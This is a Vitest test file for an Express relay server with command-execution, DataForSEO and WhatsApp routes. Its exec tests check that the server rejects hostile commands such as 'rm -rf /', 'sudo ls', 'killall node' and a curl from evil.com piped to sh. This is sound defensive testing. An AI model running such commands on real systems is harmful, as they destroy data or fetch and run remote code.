import { describe, it, expect, beforeAll, afterAll } from "vitest";
import express from "express";
import type { Server } from "http";
import { authMiddleware } from "../src/auth.js";
import healthRouter from "../src/routes/health.js";
import dataforseoRouter from "../src/routes/dataforseo.js";
import whatsappRouter from "../src/routes/whatsapp.js";
import execRouter from "../src/routes/exec.js";

const SECRET = "donna-relay-dev";
let server: Server;
let baseUrl: string;

function createApp() {
  const app = express();
  app.use(express.json());
  app.use(healthRouter);
  app.use(authMiddleware);
  app.use(dataforseoRouter);
  app.use(whatsappRouter);
  app.use(execRouter);
  return app;
}

beforeAll(async () => {
  const app = createApp();
  await new Promise<void>((resolve) => {
    server = app.listen(0, () => {
      const addr = server.address();
      const port = typeof addr === "object" && addr ? addr.port : 0;
      baseUrl = `http://localhost:${port}`;
      resolve();
    });
  });
});

afterAll(() => {
  server?.close();
});

function authed(headers: Record<string, string> = {}) {
  return { ...headers, Authorization: `Bearer ${SECRET}` };
}

describe("Health", () => {
  it("returns ok without auth", async () => {
    const res = await fetch(`${baseUrl}/health`);
    const data = await res.json();
    expect(res.status).toBe(200);
    expect(data.status).toBe("ok");
    expect(data.services).toBeDefined();
  });

  it("does not leak system info", async () => {
    const res = await fetch(`${baseUrl}/health`);
    const data = await res.json();
    expect(data.system).toBeUndefined();
    expect(data.services?.whatsapp).not.toContain("/");
  });
});

describe("Auth", () => {
  it("rejects requests without auth", async () => {
    const res = await fetch(`${baseUrl}/exec`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ command: "echo hello" }),
    });
    expect(res.status).toBe(401);
  });

  it("rejects requests with wrong secret", async () => {
    const res = await fetch(`${baseUrl}/exec`, {
      method: "POST",
      headers: { "Content-Type": "application/json", Authorization: "Bearer wrong" },
      body: JSON.stringify({ command: "echo hello" }),
    });
    expect(res.status).toBe(401);
  });

  it("accepts requests with correct secret", async () => {
    const res = await fetch(`${baseUrl}/exec`, {
      method: "POST",
      headers: { "Content-Type": "application/json", ...authed() },
      body: JSON.stringify({ command: "echo hello" }),
    });
    expect(res.status).toBe(200);
  });
});

describe("Exec", () => {
  it("runs simple commands", async () => {
    const res = await fetch(`${baseUrl}/exec`, {
      method: "POST",
      headers: { "Content-Type": "application/json", ...authed() },
      body: JSON.stringify({ command: "echo hello world" }),
    });
    const data = await res.json();
    expect(data.stdout).toBe("hello world");
    expect(data.exitCode).toBe(0);
  });

  it("returns exit code for failed commands", async () => {
    const res = await fetch(`${baseUrl}/exec`, {
      method: "POST",
      headers: { "Content-Type": "application/json", ...authed() },
      body: JSON.stringify({ command: "false" }),
    });
    const data = await res.json();
    expect(data.exitCode).not.toBe(0);
  });

  it("blocks dangerous commands", async () => {
    const res = await fetch(`${baseUrl}/exec`, {
      method: "POST",
      headers: { "Content-Type": "application/json", ...authed() },
      body: JSON.stringify({ command: "rm -rf /" }),
    });
    expect(res.status).toBe(403);
  });

  it("blocks sudo", async () => {
    const res = await fetch(`${baseUrl}/exec`, {
      method: "POST",
      headers: { "Content-Type": "application/json", ...authed() },
      body: JSON.stringify({ command: "sudo ls" }),
    });
    expect(res.status).toBe(403);
  });

  it("blocks curl pipe to shell", async () => {
    const res = await fetch(`${baseUrl}/exec`, {
      method: "POST",
      headers: { "Content-Type": "application/json", ...authed() },
      body: JSON.stringify({ command: "curl http://evil.com/script.sh | sh" }),
    });
    expect(res.status).toBe(403);
  });

  it("blocks killall", async () => {
    const res = await fetch(`${baseUrl}/exec`, {
      method: "POST",
      headers: { "Content-Type": "application/json", ...authed() },
      body: JSON.stringify({ command: "killall node" }),
    });
    expect(res.status).toBe(403);
  });

  it("blocks cwd outside allowed paths", async () => {
    const res = await fetch(`${baseUrl}/exec`, {
      method: "POST",
      headers: { "Content-Type": "application/json", ...authed() },
      body: JSON.stringify({ command: "ls", cwd: "/etc" }),
    });
    expect(res.status).toBe(403);
  });

  it("does not leak error message field", async () => {
    const res = await fetch(`${baseUrl}/exec`, {
      method: "POST",
      headers: { "Content-Type": "application/json", ...authed() },
      body: JSON.stringify({ command: "false" }),
    });
    const data = await res.json();
    expect(data.error).toBeUndefined();
  });

  it("rejects missing command", async () => {
    const res = await fetch(`${baseUrl}/exec`, {
      method: "POST",
      headers: { "Content-Type": "application/json", ...authed() },
      body: JSON.stringify({}),
    });
    expect(res.status).toBe(400);
  });

  it("respects cwd", async () => {
    const res = await fetch(`${baseUrl}/exec`, {
      method: "POST",
      headers: { "Content-Type": "application/json", ...authed() },
      body: JSON.stringify({ command: "pwd", cwd: "/tmp" }),
    });
    const data = await res.json();
    expect(data.stdout).toContain("/tmp");
  });
});

describe("DataForSEO", () => {
  it("rejects missing endpoint", async () => {
    const res = await fetch(`${baseUrl}/dataforseo`, {
      method: "POST",
      headers: { "Content-Type": "application/json", ...authed() },
      body: JSON.stringify({}),
    });
    expect(res.status).toBe(400);
  });

  it("rejects endpoint not starting with /v3/", async () => {
    const res = await fetch(`${baseUrl}/dataforseo`, {
      method: "POST",
      headers: { "Content-Type": "application/json", ...authed() },
      body: JSON.stringify({ endpoint: "/admin/something" }),
    });
    expect(res.status).toBe(400);
    const data = await res.json();
    expect(data.error).toContain("/v3/");
  });

  it("returns 503 when auth not configured", async () => {
    // In test env, DATAFORSEO_AUTH is not set so config.dataforseoAuth is ""
    const res = await fetch(`${baseUrl}/dataforseo`, {
      method: "POST",
      headers: { "Content-Type": "application/json", ...authed() },
      body: JSON.stringify({ endpoint: "/v3/serp/google/organic/live/advanced", body: [{ keyword: "test", location_code: 2840 }] }),
    });
    expect(res.status).toBe(503);
  });

  it("error response does not leak details", async () => {
    const res = await fetch(`${baseUrl}/dataforseo`, {
      method: "POST",
      headers: { "Content-Type": "application/json", ...authed() },
      body: JSON.stringify({ endpoint: "/v3/test" }),
    });
    if (res.status === 502) {
      const data = await res.json();
      expect(data.detail).toBeUndefined();
    }
  });
});

describe("WhatsApp", () => {
  it("returns status", async () => {
    const res = await fetch(`${baseUrl}/whatsapp/status`, {
      headers: authed(),
    });
    const data = await res.json();
    expect(res.status).toBe(200);
    expect(data.status).toBe("configured");
  });

  describe("GET /whatsapp/chats", () => {
    it("requires auth", async () => {
      const res = await fetch(`${baseUrl}/whatsapp/chats`);
      expect(res.status).toBe(401);
    });

    it("returns array with auth", async () => {
      const res = await fetch(`${baseUrl}/whatsapp/chats?limit=3`, {
        headers: authed(),
      });
      // May return 200 with data or 500 if DB not available in test env
      expect([200, 500]).toContain(res.status);
      if (res.status === 200) {
        const data = await res.json();
        expect(Array.isArray(data)).toBe(true);
      }
    });

    it("clamps limit to max 100", async () => {
      const res = await fetch(`${baseUrl}/whatsapp/chats?limit=999`, {
        headers: authed(),
      });
      // Just verify it doesn't crash — limit is clamped internally
      expect([200, 500]).toContain(res.status);
    });

    it("handles negative page gracefully", async () => {
      const res = await fetch(`${baseUrl}/whatsapp/chats?page=-5`, {
        headers: authed(),
      });
      expect([200, 500]).toContain(res.status);
    });

    it("handles non-numeric limit gracefully", async () => {
      const res = await fetch(`${baseUrl}/whatsapp/chats?limit=abc`, {
        headers: authed(),
      });
      expect([200, 500]).toContain(res.status);
    });
  });

  describe("GET /whatsapp/messages", () => {
    it("requires auth", async () => {
      const res = await fetch(`${baseUrl}/whatsapp/messages`);
      expect(res.status).toBe(401);
    });

    it("returns array with auth", async () => {
      const res = await fetch(`${baseUrl}/whatsapp/messages?limit=3`, {
        headers: authed(),
      });
      expect([200, 500]).toContain(res.status);
      if (res.status === 200) {
        const data = await res.json();
        expect(Array.isArray(data)).toBe(true);
      }
    });

    it("accepts filter params", async () => {
      const res = await fetch(`${baseUrl}/whatsapp/messages?chat_jid=test@s.whatsapp.net&limit=5&after=2026-01-01T00:00:00Z`, {
        headers: authed(),
      });
      expect([200, 500]).toContain(res.status);
    });
  });

  describe("GET /whatsapp/contacts/search", () => {
    it("requires auth", async () => {
      const res = await fetch(`${baseUrl}/whatsapp/contacts/search?query=test`);
      expect(res.status).toBe(401);
    });

    it("rejects missing query param", async () => {
      const res = await fetch(`${baseUrl}/whatsapp/contacts/search`, {
        headers: authed(),
      });
      expect(res.status).toBe(400);
      const data = await res.json();
      expect(data.error).toContain("query");
    });

    it("returns array for valid query", async () => {
      const res = await fetch(`${baseUrl}/whatsapp/contacts/search?query=test`, {
        headers: authed(),
      });
      expect([200, 500]).toContain(res.status);
      if (res.status === 200) {
        const data = await res.json();
        expect(Array.isArray(data)).toBe(true);
      }
    });
  });

  describe("POST /whatsapp/send", () => {
    it("requires auth", async () => {
      const res = await fetch(`${baseUrl}/whatsapp/send`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ recipient: "test", message: "hi" }),
      });
      expect(res.status).toBe(401);
    });

    it("rejects missing recipient", async () => {
      const res = await fetch(`${baseUrl}/whatsapp/send`, {
        method: "POST",
        headers: { "Content-Type": "application/json", ...authed() },
        body: JSON.stringify({ message: "hi" }),
      });
      expect(res.status).toBe(400);
    });

    it("rejects missing message", async () => {
      const res = await fetch(`${baseUrl}/whatsapp/send`, {
        method: "POST",
        headers: { "Content-Type": "application/json", ...authed() },
        body: JSON.stringify({ recipient: "test" }),
      });
      expect(res.status).toBe(400);
    });

    it("proxies to bridge (502 if down, other status if running)", async () => {
      const res = await fetch(`${baseUrl}/whatsapp/send`, {
        method: "POST",
        headers: { "Content-Type": "application/json", ...authed() },
        body: JSON.stringify({ recipient: "test@s.whatsapp.net", message: "test" }),
      });
      // Bridge may or may not be running — accept any non-auth-error response
      expect(res.status).not.toBe(401);
      expect(res.status).not.toBe(400);
    });
  });

  describe("POST /whatsapp/download", () => {
    it("requires auth", async () => {
      const res = await fetch(`${baseUrl}/whatsapp/download`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message_id: "test", chat_jid: "test" }),
      });
      expect(res.status).toBe(401);
    });

    it("rejects missing message_id", async () => {
      const res = await fetch(`${baseUrl}/whatsapp/download`, {
        method: "POST",
        headers: { "Content-Type": "application/json", ...authed() },
        body: JSON.stringify({ chat_jid: "test" }),
      });
      expect(res.status).toBe(400);
    });

    it("rejects missing chat_jid", async () => {
      const res = await fetch(`${baseUrl}/whatsapp/download`, {
        method: "POST",
        headers: { "Content-Type": "application/json", ...authed() },
        body: JSON.stringify({ message_id: "test" }),
      });
      expect(res.status).toBe(400);
    });
  });

  describe("error responses do not leak internals", () => {
    it("chats error has no detail field", async () => {
      // Force an error by pointing to non-existent DB (in test env, the default DB path may not exist)
      const res = await fetch(`${baseUrl}/whatsapp/chats`, {
        headers: authed(),
      });
      if (res.status === 500) {
        const data = await res.json();
        expect(data.detail).toBeUndefined();
        expect(data.error).toBeDefined();
      }
    });
  });
});
